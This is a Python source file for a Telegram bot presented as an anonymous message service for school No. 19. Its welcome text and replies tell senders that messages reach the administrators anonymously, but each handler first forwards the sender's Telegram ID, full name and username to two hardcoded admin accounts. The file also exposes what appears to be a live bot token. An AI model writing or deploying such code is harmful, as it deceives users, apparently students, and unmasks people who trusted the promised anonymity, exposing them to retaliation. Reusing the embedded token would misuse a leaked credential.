import telebot

# Конфигурация
BOT_TOKEN = "8419583158:AAHSlwvz0Incd6QmLJLCbdvzs9219wW-XnQ"
ADMIN_USER_IDS = ["8209990188", "1870435438"]  # Список администраторов

bot = telebot.TeleBot(BOT_TOKEN)


# Функция для получения информации о пользователе
def get_user_info(user):
    username = f"@{user.username}" if user.username else "не указан"
    first_name = user.first_name or "не указано"
    last_name = user.last_name or "не указана"

    return {
        'id': user.id,
        'first_name': first_name,
        'last_name': last_name,
        'username': username,
        'full_name': f"{first_name} {last_name}".strip()
    }


# Функция для отправки информации об отправителе всем администраторам
def send_user_info_to_all_admins(user_info, message_type, message_date):
    info_message = (
        f"─── 🔍 НОВОЕ СООБЩЕНИЕ ───\n"
        f"📦 Тип: {message_type}\n"
        f"🆔 ID: {user_info['id']}\n"
        f"👤 Имя: {user_info['full_name']}\n"
        f"📛 Юзернейм: {user_info['username']}\n"
        f"────────────────────"
    )

    for admin_id in ADMIN_USER_IDS:
        try:
            bot.send_message(admin_id, info_message)
        except Exception as e:
            print(f"Ошибка отправки информации администратору {admin_id}: {e}")


# Функция для отправки сообщения всем администраторам
def send_message_to_all_admins(message_text):
    for admin_id in ADMIN_USER_IDS:
        try:
            bot.send_message(admin_id, message_text)
        except Exception as e:
            print(f"Ошибка отправки сообщения администратору {admin_id}: {e}")


# Функция для отправки медиа всем администраторам
def send_media_to_all_admins(media_type, file_id, caption=None):
    for admin_id in ADMIN_USER_IDS:
        try:
            if media_type == 'photo':
                bot.send_photo(admin_id, file_id, caption=caption)
            elif media_type == 'video':
                bot.send_video(admin_id, file_id, caption=caption)
            elif media_type == 'document':
                bot.send_document(admin_id, file_id, caption=caption)
            elif media_type == 'audio':
                bot.send_audio(admin_id, file_id, caption=caption)
            elif media_type == 'voice':
                bot.send_voice(admin_id, file_id)
            elif media_type == 'sticker':
                bot.send_sticker(admin_id, file_id)
            elif media_type == 'video_note':
                bot.send_video_note(admin_id, file_id)
        except Exception as e:
            print(f"Ошибка отправки медиа администратору {admin_id}: {e}")


# Функция для отправки локации всем администраторам
def send_location_to_all_admins(latitude, longitude):
    for admin_id in ADMIN_USER_IDS:
        try:
            bot.send_location(admin_id, latitude, longitude)
        except Exception as e:
            print(f"Ошибка отправки локации администратору {admin_id}: {e}")


# Функция для отправки контакта всем администраторам
def send_contact_to_all_admins(phone_number, first_name, last_name):
    for admin_id in ADMIN_USER_IDS:
        try:
            bot.send_contact(admin_id, phone_number, first_name, last_name)
        except Exception as e:
            print(f"Ошибка отправки контакта администратору {admin_id}: {e}")


# Обработчик команд /start и /help
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    welcome_text = (
        "👋 Привет! Я бот для анонимных сообщений школы №19.\n\n"
        "📝 Просто отправь мне любое сообщение (текст, фото, видео, голосовые и т.д.), "
        "и я перешлю его администраторам анонимно.\n\n"
    )

    bot.reply_to(message, welcome_text)


# Команда для получения ID администратора
@bot.message_handler(commands=['admin_id'])
def get_admin_id(message):
    user_info = get_user_info(message.from_user)

    response_text = (
        f"🆔 ID этого бота: {bot.get_me().id}\n"
        f"🆔 Твой ID: {user_info['id']}\n"
        f"👤 Твое имя: {user_info['full_name']}\n"
        f"📛 Юзернейм: {user_info['username']}\n\n"
        f"📨 Сообщения отправляются {len(ADMIN_USER_IDS)} администраторам"
    )

    bot.reply_to(message, response_text)


# Обработчик текстовых сообщений
@bot.message_handler(content_types=['text'], func=lambda message: message.chat.type == 'private')
def handle_text(message):
    user_info = get_user_info(message.from_user)

    try:
        # Сначала отправляем информацию об отправителе всем администраторам
        send_user_info_to_all_admins(user_info, "📝 Текст", message.date)

        # Затем отправляем само сообщение всем администраторам
        send_message_to_all_admins(f"{message.text}")

        # Подтверждение пользователю
        bot.reply_to(message, "✅ Ваше сообщение отправлено администраторам анонимно!")

    except Exception as e:
        print(f"Ошибка: {e}")
        bot.reply_to(message, "❌ Произошла ошибка при отправке сообщения")


# Обработчик медиа сообщений
@bot.message_handler(
    content_types=['photo', 'video', 'document', 'audio', 'voice', 'sticker', 'video_note'],
    func=lambda message: message.chat.type == 'private'
)
def handle_media(message):
    user_info = get_user_info(message.from_user)

    # Типы медиа для русского отображения
    media_types = {
        'photo': ('🖼 Фото', 'фото'),
        'video': ('🎥 Видео', 'видео'),
        'document': ('📄 Документ', 'документ'),
        'audio': ('🎵 Аудио', 'аудио'),
        'voice': ('🎤 Голосовое сообщение', 'голосовое сообщение'),
        'sticker': ('🎨 Стикер', 'стикер'),
        'video_note': ('📹 Видео-заметка', 'видео-заметку')
    }

    media_type, media_type_lower = media_types.get(message.content_type, ('📎 Медиа', 'медиа'))

    try:
        # Сначала отправляем информацию об отправителе всем администраторам
        send_user_info_to_all_admins(user_info, media_type, message.date)

        # Затем отправляем само медиа всем администраторам
        if message.content_type == 'photo':
            send_media_to_all_admins('photo', message.photo[-1].file_id, message.caption)

        elif message.content_type == 'video':
            send_media_to_all_admins('video', message.video.file_id, message.caption)

        elif message.content_type == 'document':
            send_media_to_all_admins('document', message.document.file_id, message.caption)

        elif message.content_type == 'audio':
            send_media_to_all_admins('audio', message.audio.file_id, message.caption)

        elif message.content_type == 'voice':
            send_media_to_all_admins('voice', message.voice.file_id)

        elif message.content_type == 'sticker':
            send_media_to_all_admins('sticker', message.sticker.file_id)

        elif message.content_type == 'video_note':
            send_media_to_all_admins('video_note', message.video_note.file_id)

        # Подтверждение пользователю
        bot.reply_to(message, f"✅ Ваше {media_type_lower} отправлено администраторам анонимно!")

    except Exception as e:
        print(f"Ошибка отправки медиа: {e}")
        bot.reply_to(message, f"❌ Произошла ошибка при отправке {media_type_lower}")


# Обработчик location и contact
@bot.message_handler(content_types=['location', 'contact'], func=lambda message: message.chat.type == 'private')
def handle_location_contact(message):
    user_info = get_user_info(message.from_user)

    try:
        # Сначала отправляем информацию об отправителе всем администраторам
        if message.content_type == 'location':
            send_user_info_to_all_admins(user_info, "📍 Локация", message.date)
            # Затем отправляем локацию всем администраторам
            send_location_to_all_admins(message.location.latitude, message.location.longitude)

        elif message.content_type == 'contact':
            send_user_info_to_all_admins(user_info, "📞 Контакт", message.date)
            # Затем отправляем контакт всем администраторам
            contact = message.contact
            send_contact_to_all_admins(
                contact.phone_number,
                contact.first_name,
                contact.last_name or ""
            )

        # Подтверждение пользователю
        bot.reply_to(message, "✅ Ваши данные отправлены администраторам!")

    except Exception as e:
        print(f"Ошибка отправки location/contact: {e}")
        bot.reply_to(message, "❌ Ошибка при отправке данных")


# Команда для проверки бота (только для администраторов)
@bot.message_handler(commands=['check'], func=lambda message: str(message.from_user.id) in ADMIN_USER_IDS)
def check_bot(message):
    bot.reply_to(message, "✅ Бот работает корректно!\n"
                          f"Сообщения отправляются {len(ADMIN_USER_IDS)} администраторам.\n"
                          "Информация об отправителе и сообщения отправляются отдельно.")


# Команда для статистики (только для администраторов)
@bot.message_handler(commands=['stats'], func=lambda message: str(message.from_user.id) in ADMIN_USER_IDS)
def show_stats(message):
    stats_text = (
        f"📊 Статистика бота:\n"
        f"• Все сообщения пользователей приходят {len(ADMIN_USER_IDS)} администраторам\n"
        f"• Информация об отправителе и сообщения отправляются отдельными сообщениями\n"
        f"• Администраторы: {', '.join(ADMIN_USER_IDS)}\n"
        f"• Бот готов к работе!"
    )
    bot.reply_to(message, stats_text)


# Запуск бота
if __name__ == "__main__":
    print("=" * 50)
    print("Бот анонимных сообщений запущен!")
    print("=" * 50)
    print(f"ID бота: {bot.get_me().id}")
    print(f"Администраторы: {', '.join(ADMIN_USER_IDS)}")
    print(f"Количество администраторов: {len(ADMIN_USER_IDS)}")
    print("Все сообщения будут приходить всем администраторам")
    print("Информация об отправителе и сообщения отправляются отдельно")
    print("=" * 50)

    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Ошибка при запуске бота: {e}")
